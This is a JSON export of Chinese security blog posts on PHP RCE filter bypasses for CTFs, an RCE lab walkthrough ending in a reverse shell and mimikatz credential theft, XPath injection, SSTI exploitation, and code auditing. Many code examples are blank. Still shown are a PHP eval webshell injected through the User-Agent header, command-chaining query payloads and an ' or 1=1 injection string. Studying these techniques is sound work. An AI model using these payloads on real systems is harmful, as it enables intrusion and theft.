[{"title":"RCE总结","date":"2021-07-15T00:15:30.000Z","url":"/2021/07/14/RCE%E6%80%BB%E7%BB%93/","tags":[["RCE","/tags/RCE/"]],"categories":[["RCE","/categories/RCE/"]],"content":"一、RCE的定义RCE英文全称：remote command/code execute分为远程命令执行ping和远程代码执行evel。漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。 二、RCE利用函数1.代码注入①eval() 说明：eval()把字符串code 作为PHP代码执行。 Caution函数eval()语言结构是非常危险的，因为它允许执行任意PHP代码。它这样用是很危险的。如果您仔细的确认过，除了使用此结构以外别无方法,请多加注意，不要允许传入任何由用户提供的、未经完整验证过的数据。 PS:传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。 return 语句会立即中止当前字符串的执行。 代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。 ②assert()PHP 5 PHP 7 说明：assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。 Traditional assertions(PHP 5 and 7)如果assertion是字符串，它将会被assert()当做PHP代码来执行。assertion是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含assertion表达式。这意味着如果你传入了boolean的条件作为assertion，这个条件将不会显示为断言函数的参数;在调用你定义的assert_options()处理函数时，条件会转换为字符串，而布尔值FALSE会被转换成空字符串。 ③call_user_func()/call_user_func_array()(PHP 4,PHP 5, PHP 7) 说明：call_user_func 一把第一个参数作为回调函数调用第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。可以传递任何内置函数或用户自定义函数，除了语言结构如array(),echo(),empty(),eval(),exit(),isset(),list(),print(),unset() ④create_function()(PHP 4 &gt;= 4.0.1,PHP 5,PHP 7) 说明：create_function()根据传递的参数创建匿名函数，并为其返回唯一的名称 ⑤usort()/uasort()(PHP 4,PHP 5, PHP 7) 说明：usort()使用用户自定义的比较函数对数组中的值进行排序 本函数将用用户自定义的比较函数对一个数组中的值进行排序。如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。 例子： 运行结果： ⑥ob_start()(PHP 4, PHP 5,PHP 7) 说明：ob_start()打开输出控制缓冲 此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（(除http标头外)，相反需要输出的内容被存储在内部缓冲区中。内部缓冲区的内容可以用ob_get_contents()函数复制到一个字符串变量中。想要输出存储在内部缓冲区中的内容，可以使用ob_end_flush()函数。另外，使用ob_end_clean()函数会静默丢弃掉缓冲区的内容。Warning 当有正在调用的回调函数时，一些网络服务器（例如Apache)会改变一个脚本的工作目录。你可以在回调函数中再把它改回来，例如chdir(dirname($_SERVER[‘SCRIPT_FILENAME’]))。输出缓冲区是可堆叠的，这即意谓着，当有一个ob_start()是活跃的时，你可以调用另一个ob_start()。只要确保又正确调用了ob_end_flush()恰当的次数即可。如果有多重输出回调函数是活跃的，输出内容会一直按嵌套的顺序依次通过它们而被过滤。 ⑦${php代码}${}可以将大括号内的PHP代码当作命令进行执行。 三、命令执行绕过1.过滤cat,flag等关键词①代替 ②使用转义符 ③内联执行绕过拼接flag ④变量绕过 ⑤编码进制绕过base64Y2F0IDEudHh0 为 cat 1.txt的base64编码 16进制0x636174202E2F312E747874 为 cat 1.txt的十六进制编码 \\x63\\x61\\x74\\x20\\x2E\\x2F\\x31\\x2E\\x74\\x78\\x74 为 cat 1.txt的十六进制编码 ⑥过滤文件名绕过 1) 利用正则匹配绕过例如：过滤/1010/flag.php文件 2)利用未初始化变量，使用$u绕过 例如过滤/1010/flag.pgp中的1010 ⑦命令执行函数system()绕过system(“whoami”) 1)十六进制绕过“\\x73\\x79\\x73\\x74\\x65\\x6d”(“whoami”); 2)括号绕过(sy.(st).em)(whoami); 3)使用内敛执行代替system ⑧使用$*和$@，$x,${数字}注：因为在没有传参的情况下，上面的特殊变量都是为空的 ⑨其他读取文件方式 dir与ls的代替find 列出当前目录下的文件以及子目录所有文件 2.过滤空格 3.过滤目录分隔符 (/)例子： 采用多个管道命令 4.过滤分隔符 | &amp; ;①可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号 功能 符号 payload 换行符 %0a ?cmd=123%0als 回车符 %0d ?cmd=123%0dls 连续指令 ; ?1=123;pwd 后台进程 &amp; ?1=123&amp;pwd 管道 | ?1=123|pwd 逻辑运算 ||或&amp;&amp; ?1=123&amp;&amp;pwd 符号 功能 ； 分号 | 只执行后面那条命令 || 只执行前面那条命令 &amp; 两条命令都会执行 &amp;&amp; 两条命令都会执行 ②?&gt;代替;在php中可以用?&gt;来代替最后一个;因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。 5.字符串长度受限有事我们的命令长度可能受限，这时我们可以使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的 6.无回显①shell_exec等无回显函数。判断方法： 利用：Ⅰ.复制，压缩，写shell等方法 Ⅱ.压缩方法 Ⅲ.写shell方法 Ⅳ.在vps上建立记录脚本在自己的公网服务器站点根目录写入php文件，内容如下： 在目标服务器的测试点可以发送下面其中任意一条请求进行测试 Ⅴ.通过http请求注意：ping命令不会产生http请求 1.在公网服务器监听监听端口 2.向目标服务器发起http请求，执行curl命令 如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞。 Ⅵ.DNS请求网址： 查看我的Identifier： 访问qwzf.48hw0o.ceye.io，会记录所有收到的域名解析请求 向目标服务器发起http请求 得到root命令，说明测试点存在命令执行 利用： 例子： 输入： Ⅶ.linux tee命令Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。 用法: ②/dev/null 2&gt;&amp;1类无回显例题：ctfshow-web入门42 /dev/null 2&gt;&amp;1主要意思是不进行回显的意思进行命令分隔即可 符号 功能 ； 分号 | 只执行后面那条命令 || 只执行前面那条命令 &amp; 两条命令都会执行 &amp;&amp; 两条命令都会执行 payload: 7.Perl中open命令执行（GET）①使用GET读取文件如果GET后面跟路径的话，可以直接获取文件或目录内容 读取根目录 ②使用GET执行命令GET底层实现使用的是open函数，而open函数可以执行命令，所以我们可以用GET来执行命令 Perl在线工具 当GET使用file协议的时候就会调用到perl的open函数 PS:必须得满足前面的文件存在才会命令执行，所以我们要创建一个与命令同名的文件 例子：  payload: 8.无数字字母getshell①取反php可以对汉字取反获得乱码，但大多数会包含一个字母，例如你字取反为\u001bB_其中第二位就是大写字母B，所以可以通过这种方法获得字母B 这里使用羽师傅的脚本 ②异或当过被滤掉字母时，我们可以使用异或运算的方法来拼写字母 python异或查询脚本 pyhon异或运算转换脚本 ③或运算原理与异或相同 这里使用猫神师傅的脚本 9.过滤括号①使用不需要括号的函数echo require ②使用取反 10.无参数RCE什么是无参数函数RCE 我们常用eval($_GET[&#39;code&#39;]);来实现一句换木马和getshell 但是如果开发者进行了过滤 那么我们就无法使用参数，也就无法通过正则的校验 在此过滤条件下我们只能执行如下格式的函数 不可使用 ①getenv()使用getenv()获取一个环境变量的值 使用array_rand()来取出数组 使用arrat_flip()来取出数组中的值 注意每次运行输出的字符串是随机的 例子： ②getallheaders()获取所有环境变量的列表，可以看到，成功返回了http header，我们可以在header中自定义内容 ③get_defined_vars()get_defined_vars()可以回显全局变量_GET $_POST $_FILES $_COOKIE 可以利用$_GET进行RCE ④session_id() SESSIONID只能为字母和数字，所以我们可以用十六进制 ⑤dirname() &amp; chdir()我们可以利用getcwd()获取当前目录 用dirname()返回上级目录 使用chdir(dirname(getcwd()))来更改目录 最终paylocd： 11.内敛执行将``或$()内命令的输出作为输入执行 常用payload: 12.open_basedir绕过①利用chdir()与ini_set()组合绕过使用chdir(‘img’)到文件的子目录 获取目录： 读取文件： ②利用glob://伪协议绕过PS:此方法只能列出根目录下的文件 glob:// — 查找匹配的文件路径模式。 glob://是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下： 绕过原理：只是用glob://伪协议是无法直接绕过的，它需要结合其他函数组合利用，主要有以下两种利用方式，局限性在于它们都只能列出根目录下和open_basedir指定的目录下的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容 Ⅰ.DirectoryIterator+glob:// DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件： 输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件 例子：ctfshow-web入门72 payload： 发现flag0.txt Ⅱ.opendir()+readdir()+glob:// opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目 这里结合两个函数来列举根目录中的文件： 效果和①是一样的，只能绕过 open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件 例子：ctfshow-web入门72 payload： 发现flag0.txt ③利用syslink()函数绕过 符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身绕过方式： 原理是创建一个链接文件flag用相对路径指向A/B/C/D，再创建一个链接文件exp指向flag/…/…/…/…/etc/passwd，其实就是指向了A/B/C/D/…/…/…/…/etc/passwd，也就是/etc/passwd。这时候删除aaa文件再创建aaa目录但是exp还是指向了aaa也就是A/B/C/D/…/…/…/…/etc/passwd，就进入了路径/etc/passwd PS:payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个…/来设置目标文件。 13.disable_function绕过PHP绕过disable_function限制 PHP绕过disable_function限制 14.通配符+绝对路径调用命令原理：因为默认配置了环境变量使用才可以直接使用cat 等命令，但是可以使用路径调用命令如 /bin/cat，再加上通配符就能绕过很多限制 （ZmxhZ3tJX0FNX0FfRkxBR30= 为flag{I_AM_A_FLAG}的十六进制编码） 例子： 主要过滤了字母，分号，&lt;&gt;，使用通配符代替字母，目录调用命令即可。 payload1： payload2: 然后下载flag.php.bz2 15.grep绕过关键词过滤 16.使用~$()构造数字当数字被过滤时，我们可以使用shell语句~$()来构建我们想要的数字 例子：构造一个数字5 先输出六个-1 再取反 最后执行 得到数字5 17.绕过disable_functions当getshell后却无法执行系统命令 因为可能被设置了disable_functions函数，我们可以通过uaf脚本来绕过这个函数。 这里涉及到很多pwn的知识，本人主要学习web，对pwn的认识比较浅薄，在这里推荐几篇优秀的文章供大家参考。 推荐文章： 绕过Disable Fucntons PHP绕过disable_function限制 UAF的学习 Wiki 18.利用php内置类rce①利用 FilesystemIterator 获取指定目录下的所有文件例子：ctfshow-web110 payload： ②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理 Exception来rce例子： ctfshow-web109 payload： 19.$PATH环境变量绕过 ①大写字母数字和{}绕过 ②大写字母和{}绕过 当不允许我们使用数字时，我们可以用环境变量长度来代替数字PS:不同系统的环境可能不同，所以环境变量的长度可能不同。 我们可以用下列语句搜寻我们预期长度的环境变量 所以构建语句 四、文件包含伪协议文件包含（伪协议后必须是文件绝对路径） file:// 访问本地文件系统http:// 访问 HTTPs 网址ftp:// 访问 ftp URLphp:// 访问输入输出流zlib:// 压缩流data:// 数据ssh2:// security shell2expect:// 处理交互式的流glob:// 查找匹配的文件路径 包含函数 ①php://inputphp://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。 例子： payload： ②.php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。 php://filter的各种过滤器 ③data://data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行 读php文件源码： 者命令执行： ④zip://,bzip2://,zlib://,phar://把shell压缩到zip中，如果file参数可控，可以通过该协议访问压缩包中文件 payload如下： 例子： payload： ⑤file伪协议 ⑥日志包含先读取日志文件，发现可以读取 或 可以上传一句话木马，进行连接。 例子： ctfshow萌新计划web20 burpsuite抓包，修改User-Agent为&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt; 蚁剑访问： ⑦固定后缀包含 include($c.”.php”);例子： ctfshow-web39 payload： 使用data协议 ⑧利用session.upload_progress进行文件包含利用session.upload_progress进行文件包含 参考 浅谈PHP无回显命令执行的利用 Perl中GET命令执行 无字母数字的webshell 无参数函数RCE PHP Parametric Function RCE CTF-RCE-总结（只记录解题方法，不记录具体原理） Bypass open_basedir 文件包含中的伪协议"},{"title":"REC(远程代码执行漏洞)原理及漏洞利用","date":"2021-06-02T04:00:00.000Z","url":"/2021/06/02/REC(%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","tags":[["RCE","/tags/RCE/"]],"categories":[["RCE","/categories/RCE/"]],"content":"作用RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 系统命令执行函数 windows系统命令拼接方式 RCE漏洞复现一、复现环境靶机：win10：ip：192.168.203.135 攻击机：win10：ip：192.168.123.150 get shell机：kali2020：ip：192.168.203.130 二、漏洞复现1.靶机创建文件：1.php 2.攻击机创建文件：2.php 3.访问1.php靶机访问：输入 发现可以执行cmd命令 攻击机也可访问： 漏洞利用利用cmd命令远程下载文件 (1.txt不需要创建) 将2.php文件上传 攻击机中访问： 使用kali的nc监听3939端口 浏览器访问2.php文件 监听成功，成功get shell 其他利用1.获取win7密码如果靶机是win7，我们可以上传mimikatz.exe文件来获取win7系统的所有账号密码 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dCy29D0G-1626670751825)(C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210719125027466.png)] 获取账号密码后，就可以开启远程连接服务了 如果开启不成功，须执行以下命令 然后再开启一次 最后主机使用快捷键win+s，搜索mstsc 就可以打开windos远程桌面连接了 2.nc反弹向靶机上传nc.exe文件 kali监听 成功get shell"},{"title":"Xpath基础","date":"2021-05-03T04:00:00.000Z","url":"/2021/05/03/Xpath%E5%9F%BA%E7%A1%80/","tags":[["Xpath","/tags/Xpath/"]],"categories":[["Web","/categories/Web/"]],"content":"Xpath基础一、概念（什么是xpath）XPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。 XPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。 XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似XPath基础语法 二、语法（XPath基础语法）(1)查询基本语句 这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在loginID 字段中输入：&#39; or 1=1 并在 password 中输入：&#39; or 1=1 就能绕过校验，成功获取所有user数据 (2)节点类型在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或成为根节点）。 文档的根节点即是文档结点；对应属性有属性结点，元素有元素结点。 element (元素) attribute (属性) text (文本) namespace (命名空间) processing-instruction (处理指令) comment (注释) root (根节点) 例如下面的XML文档, Harry Potter J K. Rowling 2005 29.99 &lt;/bookstore 根节点 J K. Rowling 元素节点 lang=”en”属性节点 (3)表达式XPath通过路径表达式(Path Expression)来选取节点,基本规则: 表达式 描述 nodename 选取此节点的所有子节点 / 从根节点选取 // 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置 . 选取当前节点 .. 选取当前节点的父节点 @ 选取属性或 @*：匹配任何属性节点 * 匹配任何元素节点 来看一个XML实例, 则： 路径表达式 结果 表达式 结果 bookstore 选取 bookstore 元素的所有子节点 /bookstore 选取根元素 bookstore bookstore/book 选取属于 bookstore 的子元素的所有 book 元素 //book 选取所有 book 子元素,而不管它们在文档中的位置 bookstore//book 选择属于 bookstore 元素的后代的所有 book 元素,而不管它们位于 bookstore 之下的什么位置 //@lang 选取名为 lang 的所有属性 (4)限定语限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中. 路径表达式结果： 表达式 结果 /bookstore/book[1] 选取属于 bookstore 子元素的第一个 book 元素 /bookstore/book[last()] 选取属于 bookstore 子元素的最后一个 book 元素 //title[@lang] 选取所有拥有名为 lang 的属性的 title 元素 //title[@lang=’eng’] 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性 /bookstore/book[price&gt;35.00]/title 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00 (5)通配符XPath 通配符可用来选取未知的 XML 元素. 通配符 描述 * 匹配任何元素节点 @* 匹配任何属性节点 node() 匹配任何类型的节点 实例, 表达式 结果 /bookstore/* 选取 bookstore 元素的所有子元素 //* 选取文档中的所有元素 //title[@*] 选取所有带有属性的 title 元素 (6) 选取多个路径可以在路径表达式中使用”|”运算符来选取若干路径. 实例, 表达式 结果 //book/title \\ //book/price 选取 book 元素的所有 title 和 price 元素 bookstore/book/title \\ //price 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素 (7) 运算符路径表达式中可以使用一些常见的数学运算符和逻辑运算符, (8) 函数名称 结果 ancestor 选取当前节点的所有先辈（父、祖父等） ancestor-or-self 选取当前节点的所有先辈（父、祖父等）以及当前节点本身 attribute 选取当前节点的所有属性 child 选取当前节点的所有子元素。 descendant 选取当前节点的所有后代元素（子、孙等）。 descendant-or-self 选取当前节点的所有后代元素（子、孙等）以及当前节点本身。 following 选取文档中当前节点的结束标签之后的所有节点。 namespace 选取当前节点的所有命名空间节点 parent 选取当前节点的父节点。 preceding 选取文档中当前节点的开始标签之前的所有节点。 preceding-sibling 选取当前节点之前的所有同级节点。 self 选取当前节点。 路径表达式可以是绝对路径，也可以是相对路径。例如： 绝对位置路径： /step/step/… 相对位置路径： step/step/… 其中的每一步又可以是一个表达式，包括： 轴（函数）（axis） 定义所选节点与当前节点之间的树关系 节点测试（node-test） 识别某个轴内部的节点 零个或者更多谓语（predicate） 更深入地提炼所选的节点集 例如： 例子 结果 child::book 选取所有属于当前节点的子元素的 book 节点 attribute::lang 选取当前节点的 lang 属性 child::* 选取当前节点的所有子元素 attribute::* 选取当前节点的所有属性 child::text() 选取当前节点的所有文本子节点 child::node() 选取当前节点的所有子节点 descendant::book 选取当前节点的所有 book 后代 ancestor::book 选择当前节点的所有 book 先辈 ancestor-or-self::book 选取当前节点的所有book先辈以及当前节点（假如此节点是book节点的话） child::*/child::price 选取当前节点的所有 price 孙。 "},{"title":"SSTI(模板注入)漏洞利用","date":"2021-04-12T22:23:16.000Z","url":"/2021/04/12/SSTI(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","tags":[["SSTI","/tags/SSTI/"]],"categories":[["Web","/categories/Web/"]],"content":"读写文件读文件：方法一利用.index()模块 方法二： flie类：(在字符串的所属对象种获取str的父类，在其object父类种查找其所有子类，第41个为file类) 方法三：字模块利用_frozen_importlib_external.FileLoader类：(前置查询一样，第91个类) 方法四：通过函数解析-&gt;基本类-&gt;基本类子类-&gt;重载类-&gt;引用-&gt;查找可用函数 写文件：方法一： 存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。 方法二： 命令执行第一类利用eval 进行命令执行。 第二类利用warnings.catch_warnings 进行命令执行 首先，查看 warnings.catch_warnings 方法的位置： 查看 linecatch 的位置： 查找 os 模块的位置： 查找 system 方法的位置： 调用 system 方法： 第三类利用 commands 进行命令执行。 1.利用getstatusoutput模块 2.利用system模块 3.利用popen模块 "},{"title":"代码审计思路详解","date":"2021-03-22T04:00:00.000Z","url":"/2021/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E8%AF%A6%E8%A7%A3/","tags":[["代码审计","/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"]],"categories":[["Web","/categories/Web/"]],"content":"代码审计概念代码审计定义代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。软件代码审计是对编程项目中源代码的全面分析，旨在发现错误，安全漏洞或违反编程约定。 它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。 代码审计对象php，java，C/C++，C#，jsp，asp，net等等 代码审计工具所谓“工欲善其事，必先利其器”，好的代码审计辅助工具可能让我的的代码审计事半功倍。 PHPSeay 一键自动化白盒审计，当发现可以漏洞后，会在下方列表框显示漏洞信息。 代码调试，方便审计过程中测试代码。 正则编码，支持MD5、UR1、Base64、Hex、ASCII、Unicode等多种编码解码转换功能。 自定义插件及规则 RIPS在这里插入图片描述 能够检测XSS、SQL注入、文件泄露、本地/远程文件包含、远程命令执行以及更多种类型的漏洞。 有5种级别选项用于显示以及辅助调试扫描结果。 标记存在漏洞的代码行。 对变量高亮显示。 在用户定义函数上悬停光标可以显示函数调用。 在函数定义和调用之间灵活跳转。 详细列出所有用户定义函数（包括定义和调用）、所有程序入口点（用户输入）和所有扫描过文件（包括include的文件）。 以可视化的图表展示源代码文件、包含文件、函数及其调用。 仅用几个鼠标点击就可以使用CURL创建针对检测到漏洞的EXP实例。 详细列出每个漏洞的描述、举例、PoC、补丁和安全函数。 7种不同的语法高亮显示模式。 使用自顶向下或者自底向上的方式追溯显示扫描结果。 一个支持PHP的本地服务器和浏览器即可满足使用需求。 正则搜索功能。 Fortify SCA 分析过程中与它特有的软件安全漏洞规则进行全面的匹配、搜索，在最终的漏洞结果中，包括详细的漏洞心理，以及漏洞相关的安全知识说明 JAVAFindBugs IDEA 能发现规范和bug的，只能静态分析 Android Lint 它会给出所有在这个项目中不规范的编码、多余的资源、可能的bug、或者其它的一些问题，然后会给出修改的建议供我们参考。 C++Flawfinder Flawfinder是一个C/C代码的开源安全审查工具，采用内建语法缺陷数据库，能够标记类似缓冲溢出、格式字符串、竞争条件、随机数获取方面的问题。Flawfinder是一个非常简单的工具，采用的算法也不复杂，可以看做是一个基于词典的源代码静态分析器。 其他语言JSeslint、NodeJsScan Gogoint、go tool vet、gas Pythonpylint、bandit、py-find-injection、pyt 多种语言的安全代码检查工具sonar 商业代码审计工具静态分析工具​ RISP，VCG，Fortify SCA 动态分析工具​ 360的sky wolf，鸟哥的taint 代码审计思路1）根据敏感关键字回溯参数传递过程根据敏感函数来你想追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。 优点：只需要搜索相应的敏感关键字，即可快速地挖掘想要的漏洞，可定向挖掘、高效、高质量。 缺点：由于没有通读代码，对程序的整体，对程序的整体框架了解不够深入，在挖掘漏洞时定位需要花费一定时间、无法挖掘逻辑漏洞 PHP代码审计—-敏感函数一，预定义的变量[常规外部提交的变量] 除$_GET $_POST $_COOKIE的提交外，还来源于 $_SERVER $_ENV $_SESSION等 二，regist_globle=on（未初始化的变量） 当on的时候，传递的值会被直接注册为全局变量直接使用。而off时，我们需要到特定的数组 得到他，php&gt;4.2.0 default 关闭。 三，变量覆盖（未被初始化的覆盖的前定义的变量） 如 $$ 使用不当，遍历初始化变量，extract() ，parse_str() 等 四，变量的传递存储（中转的变量）存储于数据库，文件，（如配置，缓存文件等） 1，文件包含漏洞（包含任意文件）require，include,require_once,include_once 2，代码执行(执行任意代码)eval() 字符串当作代码来执行 assert() 调试函数，检查第一个断言是否为FALSE。（把传入的字符串作为php代码执行） preg_replace()（preg_replace(/“xxxx”/e)) 执行正则表达式，实现搜索和替换功能。/e修正符使preg_replace()将其中的replacement参数当作PHP代码 create_function() 创建一个匿名函数，并返回都独一无二的函数名。 3，命令执行（执行任意命令漏洞）exec() 执行一个外部程序 passthru() 执行外部程序并显示原始输出 proc_open() 执行一个命令，并且打开用来输入/输出的文件指针 shell_exec() 通过shell环境执行命令，并且将完整的输出以字符串的方式返回 system() 执行外部程序，并且显示输出 popen() 通过popen()的参数传递一条命令，并且对popen()所打开的文件进行执行 4.漏洞挖掘时SQL注入漏洞和XSS漏洞需注意的关键字SQL注入漏洞 出现位置 登录界面、获取HTTP开头(user-agent/client-ip)、订单处理等 普通注入 ​ 关键字 ​ select from​ mysql_connect​ mysql_query​ mysql_fetch_row​ update​ insert​ delete 宽字节注入 出现位置 文章发表、评论回复、留言、资料设置等 关键字 SET NAMES character_set_client=gbk mysql_set_charset(‘gbk’) 二次urldecode注入 关键字 urldecode rawurldecode XSS漏洞 关键字 print print_r echo printf sprintf die var_dump var_export Java代码审计—-敏感函数命令执行函数GroovyShell.evaluate() Runtime.getRuntime() .exec() ProcessBuilder() .start() 文件上传函数ServletFileUpload() FileItemStream() MultipartFile() SSRF函数在Java中分为两类： 一类只支持http,https协议，如HttpURLConnection、HttpClient、Request、okhttp；一类支持所有协议如URLConnection、URL。 HttpURLConnection.getInputStream() URLConnection.getInputStream() Request.Get.execute() Request.Post.execute() URL.openStream() ImageIO.read() OkHttpClient.newCall.execute() HttpClents.execute() HttpClent.execute() CORS跨域漏洞CORS跨域设置response.setHeader(“Access-Control-Allow-Origin”,”*”); response.setHeader(“Access-Control-Allow-Credentials”,”true”); 或者 @CrossOrigin(“*”) Jsonp劫持jsonp跨域设置 response.setHeader(“Access-Control-Allow-Origin”,”*”); callback 反序列化readObject 杂项out XSS漏洞当out.print(“”);可控的时候，就会导致XSS漏洞。Requests Response Session session失效时间问题session.setMaxInactiveInterval(); 用户退出，session未销毁问题session.invalidate(); //销毁所有的Web应用 sessionsession.removeAttribute(); //移除指定的Web应用 sessionapplication pageContent 2）查找可控变量，正向追踪变量传递过程查找可控变量，正向追踪变量传递的过程，查找可能存在安全漏洞的变量，从变量处发现安全问题 常见的可操控变量：name、id、password、pwd、select、search等 例如miniCMS中的search处，我们可以看到变量名为search_term 通过追踪，直到后台代码，发现没有进行任何过滤，存在反射型XSS 3）寻找敏感功能点，通读功能点代码通读功能点的代码，尤其关注于易出现漏洞的功能点 如：文件上传、留言板、登录认证功能、找回密码等通过从敏感功能点入手来查找安全问题。 文件上传功能​ 若后端程序没有严格地限制上传文件的格式，导致可以直接上传或者存在绕过的情况，除了文件上传漏洞。 ​ 还有可能发生sql注入漏洞。因为程序员一般不会注意到对文件名进行过滤，但有需要把文件名存入到数据库内。 文件管理功能​ 如果程序将文件名把或者文件路径直接在参数中传递，则很有可能存在任意文件操作的漏洞。 ​ 还有可能发生xss漏洞，。程序会在页面中国输出文件名，而通常会疏忽对文件名的过滤，导致可能在数据库中存入带有尖括号等特殊 符号的文件名，最后显示在页面上的时候就会被执行。 登录认证功能​ 登陆功能不是指一个登录过程，而是整个操作过程中的认证。 ​ 目前的认证方式大多是基于Cookie和Session。 ​ 如果Cookie信息没有加salt一类的东西，就有可能导致任意用户登录漏洞，只要知道用户的部分信息，即可生成认证令牌 找回密码功能​ 找回密码虽然无法危害到服务器安全，但是可以重置管理员密码，也可以间接控制业务权限甚至拿到服务器权限。 4）直接通读全文代码通读全文代码并不是逐个读完文件就可以了，而是要有逻辑性、有目的性地选择文件进行审计。 逻辑性 ​ 通读全文代码首先要有一定的“开发者思维”，将自己想象为此软件的开发者，如果是我来设计这款软件我要实现什么功能，利用什函数结构，调用哪些接口，根据软件的功能性来分析每一个文件的作用，可以尝试画一个树状图来辅助自己理解软件的设计逻辑。 目的性 ​ 特别关注几类重要文件。 函数集文件常见命名：fuctions、common ​ 这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。 ​ 寻找这些文件一个比较好用的技巧是打开index.php或者一些功能性文件，在头部一般都能找到 配置文件常见命名：coming ​ 配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用双引号括起来，如果用双引号，则很可能会存在代码执行漏洞。 安全过滤文件常见命名：filter、safe、check ​ 这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数，其他则相对少见 index文件常见命名：index 